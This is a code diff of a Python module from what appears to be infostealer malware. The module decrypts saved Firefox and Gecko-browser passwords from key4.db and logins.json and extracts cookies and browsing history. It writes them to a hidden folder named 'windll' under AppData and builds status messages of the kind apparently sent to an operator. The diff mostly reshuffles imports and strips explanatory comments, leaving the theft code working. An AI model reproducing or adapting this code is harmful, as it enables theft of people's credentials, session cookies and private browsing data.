@@ -12,14 +12,15 @@
 
 from base64 import b64decode
 from hashlib import sha1, pbkdf2_hmac
-import hmac
-import json
+from hmac import new
+from json import load
 from pathlib import Path
-import sqlite3
-import os.path
+from sqlite3 import connect
+from os.path import join, exists
+from os import environ, sep, mkdir
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-import glob
+from glob import glob
 from pyasn1.codec.der.decoder import decode as der_decode
 from manager.logger import Log
 from Crypto.Cipher import AES, DES3
@@ -27,10 +28,8 @@ from Crypto.Cipher import AES, DES3
 
 MAGIC1 = b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
 
-# des-ede3-cbc
-MAGIC2 = (1, 2, 840, 113_549, 3, 7)
 
-# pkcs-12-PBEWithSha1AndTripleDESCBC
+MAGIC2 = (1, 2, 840, 113_549, 3, 7)
 MAGIC3 = (1, 2, 840, 113_549, 1, 12, 5, 1, 3)
 
 
@@ -58,9 +57,9 @@ def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
     hp = sha1(globalSalt + masterPassword.encode()).digest()
     pes = entrySalt + b"\x00" * (20 - len(entrySalt))
     chp = sha1(hp + entrySalt).digest()
-    k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
-    tk = hmac.new(chp, pes, sha1).digest()
-    k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
+    k1 = new(chp, pes + entrySalt, sha1).digest()
+    tk = new(chp, pes, sha1).digest()
+    k2 = new(chp, tk + entrySalt, sha1).digest()
     k = k1 + k2
     iv = k[-8:]
     key = k[:24]
@@ -70,7 +69,7 @@ def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
 def getKey(directory: Path, masterPassword=""):
     dbfile: Path = directory + "key4.db"
 
-    conn = sqlite3.connect(dbfile)
+    conn = connect(dbfile)
     c = conn.cursor()
     c.execute("""
         SELECT item1, item2
@@ -87,14 +86,13 @@ def getKey(directory: Path, masterPassword=""):
         cipherT = decodedItem2[1].asOctets()
         clearText = decrypt3DES(
             globalSalt, masterPassword, entrySalt, cipherT
-        )  # usual Mozilla PBE
+        ) 
     except AttributeError:
         encryption_method = 'AES'
         decodedItem2 = der_decode(item2)
         clearText = decrypt_aes(decodedItem2, masterPassword, globalSalt)
 
 
-    # decrypt 3des key to decrypt "logins.json" content
     c.execute("""
         SELECT a11, a102
         FROM nssPrivate
@@ -102,11 +100,11 @@ def getKey(directory: Path, masterPassword=""):
     """, (MAGIC1,))
     try:
         row = next(c)
-        a11, a102 = row  # CKA_ID
+        a11, a102 = row
     except StopIteration:
         raise Exception(
             "The Firefox database appears to be broken. Try to add a password to rebuild it."
-        )  # CKA_ID
+        )
 
     if encryption_method == 'AES':
         decodedA11 = der_decode(a11)
@@ -125,7 +123,6 @@ def PKCS7unpad(b):
     return b[: -b[-1]]
 
 def decodeLoginData(key, data):
-    # first base64 decoding, then ASN1DERdecode
     asn1data, _ = der_decode(b64decode(data))
     assert asn1data[0].asOctets() == MAGIC1
     assert asn1data[1][0].asTuple() == MAGIC2
@@ -165,7 +162,7 @@ PASSWORD: {login[2]}
 
 def getJsonLogins(directory):
     with open(directory + "logins.json", "r") as loginf:
-        jsonLogins = json.load(loginf)
+        jsonLogins = load(loginf)
     return jsonLogins
 
 
@@ -177,19 +174,17 @@ def decrypt_value(encrypted_value, key, iv):
     return decrypted_value.decode('utf-8')
 
 
-# Getting cookie
 def get_firefox_cookies(profile_path):
     try:
-        cookies_path = os.path.join(profile_path, 'cookies.sqlite')
-        if not os.path.exists(cookies_path):
+        cookies_path = join(profile_path, 'cookies.sqlite')
+        if not exists(cookies_path):
             return None
         cookies = ""
-        conn = sqlite3.connect(cookies_path)
+        conn = connect(cookies_path)
         cursor = conn.cursor()
         cursor.execute("SELECT host, name, value, path, datetime(expiry/1000000,'unixepoch') as expiry FROM moz_cookies")
         for row in cursor.fetchall():
             host, name, value, path, expires = row
-            # key = getKey(profile_path+"\\")
             cookies += f"{host}\tTRUE\t{path}\tFALSE\t{expires}\t{name}\t{value}\n"
         conn.close()
         return cookies
@@ -197,14 +192,12 @@ def get_firefox_cookies(profile_path):
         Log(f"{profile_path} cookies ---> {e}")
         return cookies
 
-# Getting history
 def get_history(directory):
     try:
         history_db_path = directory + "places.sqlite"
-        conn = sqlite3.connect(history_db_path)
+        conn = connect(history_db_path)
         cursor = conn.cursor()
 
-        # Retrieve the history of visited websites
         cursor.execute("SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') as last_visit_date FROM moz_places")
         visited_websites = cursor.fetchall()
         data = ""
@@ -229,8 +222,8 @@ Last Visit Date: {last_visit_date}
 def GeckoDriver():
     msgInfo = ""
     Log("===========GeckoDriver===========")
-    appdata = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
-    pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\windll'
+    appdata = environ['USERPROFILE'] + sep + r'AppData\Roaming'
+    pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local\windll'
 
     browsers = {
         "firefox": appdata + "\\Mozilla\\Firefox\\Profiles",
@@ -243,7 +236,7 @@ def GeckoDriver():
     browsers_data = {}
     for key, value in browsers.items():
 
-        matching_folders = glob.glob(os.path.join(value, "*default*"))
+        matching_folders = glob(join(value, "*default*"))
         i = 0
         for profile_path in matching_folders:
             browsers_data[key+"_"+str(i)] = {}
@@ -257,16 +250,16 @@ def GeckoDriver():
             i += 1
             
     if browsers_data:
-            if not os.path.exists(pathtofile+'\\Browsers\\'):
-                os.mkdir(pathtofile+'\\Browsers\\')
+            if not exists(pathtofile+'\\Browsers\\'):
+                mkdir(pathtofile+'\\Browsers\\')
 
             for browser_name in browsers_data:
 
                 new = True
 
                 if "Saved_Passwords" in browsers_data[browser_name]:
-                    if not os.path.exists(pathtofile+'\\Browsers\\'+browser_name):
-                        os.mkdir(pathtofile+'\\Browsers\\'+browser_name)
+                    if not exists(pathtofile+'\\Browsers\\'+browser_name):
+                        mkdir(pathtofile+'\\Browsers\\'+browser_name)
                     with open(f'{pathtofile}\\Browsers\\{browser_name}\\logins.txt', 'w', encoding='UTF-8') as f:
                         f.write(browsers_data[browser_name]['Saved_Passwords'])
                     if new:
@@ -275,8 +268,8 @@ def GeckoDriver():
                     msgInfo+="\n∟🔑logins"
 
                 if "Browser_History" in browsers_data[browser_name]:
-                    if not os.path.exists(pathtofile+'\\Browsers\\'+browser_name):
-                        os.mkdir(pathtofile+'\\Browsers\\'+browser_name)
+                    if not exists(pathtofile+'\\Browsers\\'+browser_name):
+                        mkdir(pathtofile+'\\Browsers\\'+browser_name)
                     with open(f'{pathtofile}\\Browsers\\{browser_name}\\history.txt', 'w', encoding='UTF-8') as f:
                         f.write(browsers_data[browser_name]['Browser_History'])
                     if new:
@@ -285,8 +278,8 @@ def GeckoDriver():
                     msgInfo+="\n∟📰history"
               
                 if "Browser_Cookies" in browsers_data[browser_name]:
-                    if not os.path.exists(pathtofile+'\\Browsers\\'+browser_name):
-                        os.mkdir(pathtofile+'\\Browsers\\'+browser_name)
+                    if not exists(pathtofile+'\\Browsers\\'+browser_name):
+                        mkdir(pathtofile+'\\Browsers\\'+browser_name)
                     with open(f'{pathtofile}\\Browsers\\{browser_name}\\cookies.txt', 'w', encoding='UTF-8') as f:
                         f.write(browsers_data[browser_name]['Browser_Cookies'])
                     if new:
